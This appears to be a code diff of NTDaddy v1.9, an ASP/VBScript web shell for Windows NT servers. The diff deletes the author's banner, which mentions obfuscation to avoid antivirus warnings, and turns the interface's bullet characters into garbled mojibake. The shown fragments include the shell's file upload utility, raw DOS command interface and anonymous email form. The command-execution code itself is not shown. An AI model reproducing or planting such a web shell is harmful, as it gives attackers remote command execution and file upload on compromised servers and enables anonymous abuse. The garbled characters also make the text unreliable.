@@ -1,34 +1,3 @@
-<!--
-Slightly obfuscated to avoid AV warnings...
-_______________________________________
-|NTDaddy  v1.9  by  obzerve  of  fux0r  inc.|
-|=====================================|
-|Vol.1:_Art.19:_Silent_Tactics_Archive|
-|******!  PUBLIC  !  DISTRIBUTION  !******|
-|-------------------------------------|
-|        Welcome  to  the  world  of  ez  remote|
-|administration  made  possible  by  your  |
-|friends  at  fux0r  inc.  NTDaddy  is  the  |
-|most  kickass  WinNT  CGI  ninja  commando|
-|tool  you've  seen  yet.  Refer  to  the      |
-|included  read  me  of  the  original  pub  |
-|distribution  for  details.  Don't  just  |
-|give  it  out,  make  people  look  for  it.|
-|And  dont  be  a  fuckin  cock  choking        |
-|gutter  slut  and  try  to  pass  it  off  as|
-|your  own.  Because  if  you  do,  you  suck|
-|ass.  Also  to  avoid  hipocrisy,  yes  a    |
-|small  snippet  was  borrowed  for  a  few  |
-|parts  here  and  there  but  for  the          |
-|majority  is  original  code  by  me,          |
-|obzerve  of  fux0r  inc.  Anyway  if  you    |
-|find  something  that  looks  'built-on',|
-|i  just  made  it  better,  you  know  how    |
-|it  is...                            oh  well,  enjoy!|
-|-------------------------------------|
-|          -obzerve  :  mr_o@ihateclowns.com  |
-=======================================
--->
 <%@  Language=VBScript  %>
 <%Dim  oScript
 Dim  oScriptNet
@@ -687,10 +656,10 @@ response.write(chr(34)  &  IP  &  chr(34)  &  ">"  &  FP)
 <table  cellpadding="3"  cellspacing="3"  border="5"  bordercolor="#ffffff">
 <tr>
 <td  align="left"  bgcolor="#F8F8FF">
-<font  color="#000000"  size="4"><b>•  Remote  Info.</b></font>
+<font  color="#000000"  size="4"><b>Â•  Remote  Info.</b></font>
 </td>
 <td  align="left"  bgcolor="#F8F8FF">
-<font  color="#000000"  size="4"><b>•  Local  Info.</b></font>
+<font  color="#000000"  size="4"><b>Â•  Local  Info.</b></font>
 </td>
 </tr>
 <tr>
@@ -726,7 +695,7 @@ response.write(chr(34)  &  IP  &  chr(34)  &  ">"  &  FP)
 <table  cellpadding="3"  cellspacing"1"  bordercolor="#F8F8FF"  border=5>
 <tr>
 <td  align="left"  bgcolor="#F8F8FF">
-<font  size="2"  color="#000000"><b>•  File  Upload  Utility</b></font></td>
+<font  size="2"  color="#000000"><b>Â•  File  Upload  Utility</b></font></td>
 </tr>
 <tr>
 <td  align="left">
@@ -737,7 +706,7 @@ response.write(chr(34)  &  IP  &  chr(34)  &  ">"  &  FP)
 </tr>
 <tr>
 <td  align="left"  bgcolor="#F8F8FF">
-<font  size="2"  color="#000000"><b>•  RAW  D.O.S.  COMMAND  INTERFACE</b></font></td>
+<font  size="2"  color="#000000"><b>Â•  RAW  D.O.S.  COMMAND  INTERFACE</b></font></td>
 </tr>
 <tr  valign="top">
 <td  align="left">
@@ -763,7 +732,7 @@ End  If%>
 <form  action=ntdaddy.asp  method=post>
 <table  border=3  cellpadding="3"  cellspacing="2"  bordercolor="#ffffff"  width="400">
 <tr>
-<td  bgcolor="#F8F8FF"  colspan="2"><font  color="#000000"  align="left"><b>•  Anonymous  Email  Utility</b></font></td>
+<td  bgcolor="#F8F8FF"  colspan="2"><font  color="#000000"  align="left"><b>Â•  Anonymous  Email  Utility</b></font></td>
 <tr>
 <td  bgcolor="#F8F8FF"><font  color="#000000"><b>From:</b></font>  </td>
 <td><input  name=From  size=30  style="HEIGHT:  22px;  WIDTH:  321px"></td></tr>
@@ -785,7 +754,7 @@ End  If%>
 </table>
 <br>
 <hr  color="#ffffff">
-<font  size="#ffffff"><center>•[  <b>NTDaddy  v1.9</b>  ][  by  obzerve  ][  for  the  brothers  of  <b>fux0r  inc.</b>  2k+1  ]•</b></center></font>
+<font  size="#ffffff"><center>Â•[  <b>NTDaddy  v1.9</b>  ][  by  obzerve  ][  for  the  brothers  of  <b>fux0r  inc.</b>  2k+1  ]Â•</b></center></font>
 </body>
 </html>
 <SCRIPT  RUNAT=SERVER  LANGUAGE=VBSCRIPT>
